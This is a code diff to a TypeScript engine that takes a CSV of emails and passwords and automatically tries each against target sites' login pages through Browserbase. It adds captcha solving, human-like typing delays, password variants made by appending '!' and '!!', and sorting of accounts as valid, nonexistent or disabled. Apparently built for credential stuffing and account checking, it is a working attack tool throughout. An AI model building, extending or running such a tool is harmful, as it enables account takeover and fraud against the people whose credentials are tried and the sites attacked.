@@ -2,6 +2,9 @@
  * AUTOMATION ENGINE
  * EventEmitter-based core that processes each CSV row through Browserbase.
  * Emits real-time events for the GUI server to relay over WebSocket.
+ *
+ * Login flow: smart response detection with multi-password retry sequences.
+ * Response-based waits (networkidle + 500ms) instead of hardcoded timers.
  */
 
 import { EventEmitter } from "events";
@@ -15,6 +18,8 @@ import * as fs from "fs";
 export interface Credential {
   email: string;
   password: string;
+  password2?: string;  // Column C — optional alternative password
+  password3?: string;  // Column D — optional alternative password
 }
 
 export interface SiteConfig {
@@ -27,7 +32,14 @@ export interface SiteConfig {
   };
 }
 
-export type Outcome = "pending" | "running" | "SUCCESS" | "FAILED" | "BLOCKED" | "ERROR";
+export type Outcome =
+  | "queued"
+  | "testing"
+  | "success"        // Login flow completed — no "incorrect" detected
+  | "noaccount"      // All password attempts returned "incorrect"
+  | "permdisabled"   // "been disabled" detected — permanent
+  | "tempdisabled"   // "temporarily disabled" — 1hr cooldown
+  | "N/A";           // Session/page crash
 
 export interface SiteStatus {
   outcome: Outcome;
@@ -38,10 +50,11 @@ export interface SiteStatus {
 export interface RowStatus {
   rowIndex: number;
   email: string;
-  status: "pending" | "running" | "done" | "skipped";
+  status: "queued" | "testing" | "done" | "skipped";
   sites: { [siteName: string]: SiteStatus };
   sessionId?: string;
   recordingUrl?: string;
+  tempDisabledUntil?: string;  // ISO timestamp — skip until this time
 }
 
 export interface EngineConfig {
@@ -51,6 +64,26 @@ export interface EngineConfig {
   maxRetries: number;
   targets: SiteConfig[];
 }
+
+// ─── Custom Errors ────────────────────────────────────────────────────────────
+
+class PermDisabledError extends Error {
+  constructor() {
+    super("Account permanently disabled");
+    this.name = "PermDisabledError";
+  }
+}
+
+class TempDisabledError extends Error {
+  constructor() {
+    super("Account temporarily disabled — 1hr cooldown");
+    this.name = "TempDisabledError";
+  }
+}
+
+// ─── Response Types ───────────────────────────────────────────────────────────
+
+type LoginResponse = "incorrect" | "disabled" | "tempdisabled" | "other" | "timeout";
 
 // ─── Default Targets ──────────────────────────────────────────────────────────
 
@@ -94,7 +127,7 @@ export class AutomationEngine extends EventEmitter {
     return this.rows;
   }
 
-  /** Parse credentials.csv into credential objects */
+  /** Parse credentials.csv into credential objects (4-column format) */
   loadCredentials(csvPath: string): Credential[] {
     if (!fs.existsSync(csvPath)) return [];
     const content = fs.readFileSync(csvPath, "utf-8");
@@ -105,16 +138,23 @@ export class AutomationEngine extends EventEmitter {
 
     if (lines.length < 2) return [];
 
-    const headers = lines[0].split(",").map((h) => h.trim());
+    const headers = lines[0].split(",").map((h) => h.trim().toLowerCase());
     const emailIdx = headers.indexOf("email");
     const passIdx = headers.indexOf("password");
+    const pass2Idx = headers.indexOf("password2");
+    const pass3Idx = headers.indexOf("password3");
     if (emailIdx < 0 || passIdx < 0) return [];
 
     return lines
       .slice(1)
       .map((line) => {
         const parts = line.split(",").map((p) => p.trim());
-        return { email: parts[emailIdx] || "", password: parts[passIdx] || "" };
+        return {
+          email: parts[emailIdx] || "",
+          password: parts[passIdx] || "",
+          password2: pass2Idx >= 0 ? (parts[pass2Idx] || "") : "",
+          password3: pass3Idx >= 0 ? (parts[pass3Idx] || "") : "",
+        };
       })
       .filter((c) => c.email && c.password);
   }
@@ -134,9 +174,9 @@ export class AutomationEngine extends EventEmitter {
     this.rows = credentials.map((c, i) => ({
       rowIndex: i,
       email: c.email,
-      status: "pending" as const,
+      status: "queued" as const,
       sites: Object.fromEntries(
-        targets.map((t) => [t.name, { outcome: "pending" as Outcome, attempts: 0 }])
+        targets.map((t) => [t.name, { outcome: "queued" as Outcome, attempts: 0 }])
       ),
     }));
 
@@ -148,11 +188,11 @@ export class AutomationEngine extends EventEmitter {
     // Clamp concurrency: default 3, absolute max 5 — never exceeded
     const concurrency = Math.min(Math.max(config.concurrency || DEFAULT_CONCURRENCY, 1), MAX_CONCURRENT_CREDENTIALS);
     this.log("INFO", `Starting automation: ${credentials.length} credentials × ${targets.length} targets`);
-    this.log("INFO", `Concurrency: ${concurrency} creds (${concurrency * targets.length} max sessions) | Max retries: ${config.maxRetries}`);
+    this.log("INFO", `Concurrency: ${concurrency} creds | Response-based waits`);
 
     const bb = new Browserbase({ apiKey: config.apiKey });
     const limit = pLimit(concurrency);
-    let batchSlot = 0; // used to stagger session starts
+    let batchSlot = 0;
 
     // Kill any stale sessions from previous runs
     await this.cleanupStaleSessions(bb, config.projectId);
@@ -161,8 +201,23 @@ export class AutomationEngine extends EventEmitter {
       limit(async () => {
         if (this.shouldStop) {
           this.rows[idx].status = "skipped";
+          for (const t of targets) this.rows[idx].sites[t.name].outcome = "N/A";
           this.emitRowUpdate(idx);
           return;
+        }
+
+        // Check tempdisabled cooldown
+        if (this.rows[idx].tempDisabledUntil) {
+          const until = new Date(this.rows[idx].tempDisabledUntil!).getTime();
+          if (Date.now() < until) {
+            this.rows[idx].status = "skipped";
+            for (const t of targets) {
+              this.rows[idx].sites[t.name].outcome = "tempdisabled";
+            }
+            this.log("WARN", `  Skipping ${cred.email} — tempdisabled until ${this.rows[idx].tempDisabledUntil}`);
+            this.emitRowUpdate(idx);
+            return;
+          }
         }
 
         // Stagger session creation to avoid concurrent limit bursts
@@ -175,15 +230,16 @@ export class AutomationEngine extends EventEmitter {
           }
         }
 
-        // Mark row as running
-        this.rows[idx].status = "running";
+        // Mark row as testing
+        this.rows[idx].status = "testing";
         this.emitRowUpdate(idx);
         this.log("INFO", `── Row ${idx + 1}/${credentials.length}: ${cred.email}`);
 
         let browser: Browser | null = null;
+        let credentialDisabled = false;  // tracks cross-site disabled state
 
         try {
-          // Create Browserbase session with retry (handles concurrent limit errors)
+          // Create Browserbase session with retry
           let session: any = null;
           for (let attempt = 1; attempt <= 3; attempt++) {
             try {
@@ -200,9 +256,9 @@ export class AutomationEngine extends EventEmitter {
                   logSession: true,
                   solveCaptchas: true,
                 },
-                keepAlive: false, // session auto-closes when browser disconnects
+                keepAlive: false,
               });
-              break; // success
+              break;
             } catch (e: any) {
               const msg = e.message || String(e);
               if (attempt < 3 && (msg.includes("concurrent") || msg.includes("429") || msg.includes("limit"))) {
@@ -211,7 +267,7 @@ export class AutomationEngine extends EventEmitter {
                 this.log("INFO", `  Retrying in ${(backoff / 1000).toFixed(1)}s...`);
                 await this.sleep(backoff);
               } else {
-                throw e; // non-retryable error
+                throw e;
               }
             }
           }
@@ -228,67 +284,85 @@ export class AutomationEngine extends EventEmitter {
 
           // Process each target site SEQUENTIALLY
           for (const target of targets) {
-            if (this.shouldStop) break;
+            if (this.shouldStop || credentialDisabled) break;
 
-            this.rows[idx].sites[target.name].outcome = "running";
+            this.rows[idx].sites[target.name].outcome = "testing";
             this.emitRowUpdate(idx);
+            this.log("INFO", `  ${target.name}: starting login flow...`);
 
-            let outcome: Outcome = "FAILED";
-            let lastError = "";
+            try {
+              const result = await this.executeLoginFlow(page, target, cred);
+              this.rows[idx].sites[target.name].outcome = result;
+              this.rows[idx].sites[target.name].attempts = 1; // will be updated inside executeLoginFlow
+              this.log(
+                result === "DONE" ? "OK" : "WARN",
+                `  → ${target.name}: ${result}`
+              );
 
-            for (let attempt = 1; attempt <= config.maxRetries; attempt++) {
-              if (this.shouldStop) break;
-
-              this.rows[idx].sites[target.name].attempts = attempt;
-              this.emitRowUpdate(idx);
-              this.log("INFO", `  ${target.name} attempt ${attempt}/${config.maxRetries}`);
-
-              try {
-                const success = await this.executeLogin(page, target, cred);
-                if (success) {
-                  outcome = "SUCCESS";
-                  break;
+              // Cross-site propagation: disabled/tempdisabled stops both sites
+              if (result === "permdisabled") {
+                credentialDisabled = true;
+                for (const t of targets) {
+                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
+                    this.rows[idx].sites[t.name].outcome = "permdisabled";
+                  }
                 }
-              } catch (e: any) {
-                lastError = e.message || String(e);
-                this.log("WARN", `  ${target.name}: ${lastError.substring(0, 100)}`);
+                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
+              } else if (result === "tempdisabled") {
+                credentialDisabled = true;
+                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                for (const t of targets) {
+                  if (this.rows[idx].sites[t.name].outcome === "pending" || this.rows[idx].sites[t.name].outcome === "running") {
+                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
+                  }
+                }
+                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown`);
               }
-
-              if (attempt < config.maxRetries) {
-                await this.sleep(2000 + Math.random() * 2000);
+            } catch (e: any) {
+              const errMsg = e.message || String(e);
+              if (e instanceof PermDisabledError) {
+                this.rows[idx].sites[target.name].outcome = "permdisabled";
+                credentialDisabled = true;
+                for (const t of targets) {
+                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
+                    this.rows[idx].sites[t.name].outcome = "permdisabled";
+                  }
+                }
+                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED`);
+              } else if (e instanceof TempDisabledError) {
+                this.rows[idx].sites[target.name].outcome = "tempdisabled";
+                credentialDisabled = true;
+                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                for (const t of targets) {
+                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
+                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
+                  }
+                }
+                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown`);
+              } else {
+                this.rows[idx].sites[target.name].outcome = "N/A";
+                this.rows[idx].sites[target.name].error = errMsg;
+                this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
               }
             }
 
-            this.rows[idx].sites[target.name].outcome = outcome;
-            if (lastError && outcome !== "SUCCESS") {
-              this.rows[idx].sites[target.name].error = lastError;
-            }
-
-            const icon = outcome === "SUCCESS" ? "✓" : "✗";
-            this.log(
-              outcome === "SUCCESS" ? "OK" : "WARN",
-              `  ${icon} ${target.name}: ${outcome}`
-            );
             this.emitRowUpdate(idx);
           }
 
           await browser.close();
           browser = null;
-          // Explicitly request session completion via API
           await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => {});
           this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
         } catch (e: any) {
           this.log("ERR", `  Session error: ${(e.message || String(e)).substring(0, 120)}`);
-          // Mark remaining sites as ERROR
           for (const target of targets) {
             const s = this.rows[idx].sites[target.name];
-            if (s.outcome === "pending" || s.outcome === "running") {
-              s.outcome = "ERROR";
+            if (s.outcome === "queued" || s.outcome === "testing") {
+              s.outcome = "N/A";
               s.error = e.message || String(e);
             }
           }
           if (browser) await browser.close().catch(() => {});
-          // Also close the Browserbase session if it was created
           if (this.rows[idx].sessionId) {
             await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => {});
           }
@@ -338,7 +412,6 @@ export class AutomationEngine extends EventEmitter {
       for (const id of stale) {
         await bb.sessions.update(id, { status: "REQUEST_RELEASE" }).catch(() => {});
       }
-      // Wait for sessions to actually close
       await this.sleep(3000);
       this.log("INFO", `Cleaned up ${stale.length} stale session(s)`);
     } catch (e: any) {
@@ -346,65 +419,167 @@ export class AutomationEngine extends EventEmitter {
     }
   }
 
-  private async executeLogin(
+  /**
+   * Build the password attempt sequence for a credential.
+   * Path A (has alt passwords): [password, password2, password3, password3]
+   * Path B (no alt passwords):  [password, password+"!", password+"!!", password+"!!"]
+   */
+  private buildPasswordSequence(cred: Credential): string[] {
+    const hasAltPasswords = !!(cred.password2 && cred.password2.length > 0);
+
+    if (hasAltPasswords) {
+      // Path A: use CSV-provided alt passwords
+      const pw2 = cred.password2!;
+      const pw3 = (cred.password3 && cred.password3.length > 0) ? cred.password3 : pw2;
+      return [cred.password, pw2, pw3, pw3]; // 4th attempt = retry pw3
+    } else {
+      // Path B: auto-generate fallback passwords
+      return [
+        cred.password,
+        cred.password + "!",
+        cred.password + "!!",
+        cred.password + "!!", // 4th attempt = retry same
+      ];
+    }
+  }
+
+  /**
+   * Wait for the site to respond after a login button press.
+   * Watches for page content changes, waits for networkidle + 500ms.
+   * Returns the detected response type.
+   */
+  private async waitForLoginResponse(page: Page, timeoutMs: number = 15000): Promise<LoginResponse> {
+    try {
+      // Wait for network to settle (page finished processing the login)
+      await page.waitForLoadState("networkidle", { timeout: timeoutMs });
+    } catch {
+      // Timeout waiting for networkidle — treat as timeout
+      return "timeout";
+    }
+
+    // Extra 500ms for late-loading DOM updates
+    await this.sleep(500);
+
+    // Read page content and check for known response phrases
+    try {
+      const content = (await page.content()).toLowerCase();
+
+      // Check for permanent disable (highest priority)
+      if (content.includes("been disabled")) {
+        return "disabled"; // maps to permdisabled outcome
+      }
+
+      // Check for temporary disable
+      if (content.includes("temporarily disabled")) {
+        return "tempdisabled";
+      }
+
+      // Check for incorrect password
+      if (content.includes("incorrect")) {
+        return "incorrect";
+      }
+
+      // No known error phrase — could be a successful login
+      return "other";
+    } catch {
+      return "timeout";
+    }
+  }
+
+  /**
+   * Execute the full login flow for a single site with smart password retry.
+   * Returns the final outcome for this site.
+   */
+  private async executeLoginFlow(
     page: Page,
     site: SiteConfig,
     cred: Credential
-  ): Promise<boolean> {
-    // ── Navigate ──
+  ): Promise<Outcome> {
+    // ── Navigate to login page ──
     await page.goto(site.url, { waitUntil: "networkidle", timeout: 30000 });
     await this.sleep(1000);
 
     // ── Dismiss cookie notices ──
     await this.dismissCookieNotice(page);
-
     await this.captureScreenshot(page, `${site.name}:page-loaded`);
 
-    // ── Fill email with human-like jitter ──
+    // ── Fill email (human-like) ──
     await page.fill(site.selectors.username, "");
     await page.click(site.selectors.username);
     await this.sleep(200 + Math.random() * 300);
     for (const ch of cred.email) {
       await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
     }
-    await this.sleep(1000);
+    await this.sleep(500);
     await this.captureScreenshot(page, `${site.name}:email-filled`);
 
-    // ── Fill password ──
-    await page.fill(site.selectors.password, "");
-    await page.click(site.selectors.password);
-    await this.sleep(200 + Math.random() * 300);
-    for (const ch of cred.password) {
-      await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
+    // ── Build password sequence ──
+    const passwords = this.buildPasswordSequence(cred);
+    const hasAltPw = !!(cred.password2 && cred.password2.length > 0);
+    this.log("INFO", `  ${site.name}: ${hasAltPw ? "Path A (alt passwords)" : "Path B (! fallbacks)"} — ${passwords.length} attempts`);
+
+    // ── Password retry loop ──
+    for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
+      const pw = passwords[attemptIdx];
+      const attemptNum = attemptIdx + 1;
+      const isRetry = attemptIdx === 3; // 4th attempt is a re-press of same password
+
+      if (!isRetry) {
+        // Fill password field with new password
+        await page.fill(site.selectors.password, "");
+        await page.click(site.selectors.password);
+        await this.sleep(200 + Math.random() * 300);
+        for (const ch of pw) {
+          await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
+        }
+        await this.sleep(500);
+        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
+      } else {
+        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
+      }
+
+      // ── Press login button ──
+      await page.click(site.selectors.submit);
+
+      // ── Wait for response (5s timeout only on 3rd attempt) ──
+      const timeout = attemptIdx === 2 ? 5000 : 15000;
+      const response = await this.waitForLoginResponse(page, timeout);
+
+      // ── Screenshot after response ──
+      await this.captureScreenshot(page, `${site.name}:attempt-${attemptNum}-${response}`);
+
+      // ── Handle response ──
+      if (response === "disabled") {
+        throw new PermDisabledError();
+      }
+
+      if (response === "tempdisabled") {
+        throw new TempDisabledError();
+      }
+
+      if (response === "other") {
+        // No "incorrect" detected — login flow completed
+        this.log("OK", `  ${site.name}: no error detected after attempt ${attemptNum} — success`);
+        return "success";
+      }
+
+      // response === "incorrect" or "timeout"
+      if (attemptNum < 4) {
+        this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} — trying next password`);
+      } else {
+        // 4th attempt still incorrect/timeout → no_account
+        this.log("WARN", `  ${site.name}: ${response} on attempt 4 — confirmed no_account`);
+        return "noaccount";
+      }
     }
-    await this.sleep(1000);
-    await this.captureScreenshot(page, `${site.name}:password-filled`);
 
-    // ── Submit ──
-    await page.click(site.selectors.submit);
-    await this.sleep(3000 + Math.random() * 2000);
-    await this.captureScreenshot(page, `${site.name}:post-submit`);
-
-    // ── Check for success ──
-    const content = await page.content();
-    const url = page.url();
-    const isSuccess =
-      content.includes("dashboard") ||
-      content.includes("account") ||
-      content.includes("welcome") ||
-      content.includes("balance") ||
-      content.includes("lobby") ||
-      !url.includes("login");
-
-    await this.captureScreenshot(page, `${site.name}:result-${isSuccess ? "success" : "failed"}`);
-    return isSuccess;
+    // Should not reach here, but safety fallback
+    return "noaccount";
   }
 
   /** Dismiss cookie consent banners by clicking accept/agree buttons */
   private async dismissCookieNotice(page: Page): Promise<void> {
-    // Common selectors for cookie accept buttons across consent frameworks
     const selectors = [
-      // Text-based: buttons containing accept/agree text
       'button:has-text("Accept")',
       'button:has-text("Accept All")',
       'button:has-text("Accept all")',
@@ -417,20 +592,17 @@ export class AutomationEngine extends EventEmitter {
       'button:has-text("OK")',
       'a:has-text("Accept")',
       'a:has-text("Accept All")',
-      // ID-based: common consent framework IDs
-      '#onetrust-accept-btn-handler',        // OneTrust
-      '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll', // CookieBot
+      '#onetrust-accept-btn-handler',
+      '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
       '#cookie-accept',
       '#accept-cookies',
       '#acceptCookies',
       '#gdpr-accept',
       '.cookie-accept',
       '.accept-cookies',
-      // Aria-based
       '[aria-label="Accept"]',
       '[aria-label="Accept All"]',
       '[aria-label="Accept cookies"]',
-      // Data attribute patterns
       '[data-action="accept"]',
       '[data-cookie-accept]',
       '[data-testid="cookie-accept"]',
@@ -449,7 +621,6 @@ export class AutomationEngine extends EventEmitter {
         // Selector didn't match — try next
       }
     }
-    // No cookie banner found — continue silently
   }
 
   /** Capture a screenshot and emit it as a log event */
@@ -480,7 +651,6 @@ export class AutomationEngine extends EventEmitter {
   }
 
   private emitRowUpdate(idx: number): void {
-    // Deep copy to avoid mutation issues
     this.emit("row-update", JSON.parse(JSON.stringify(this.rows[idx])));
   }
 
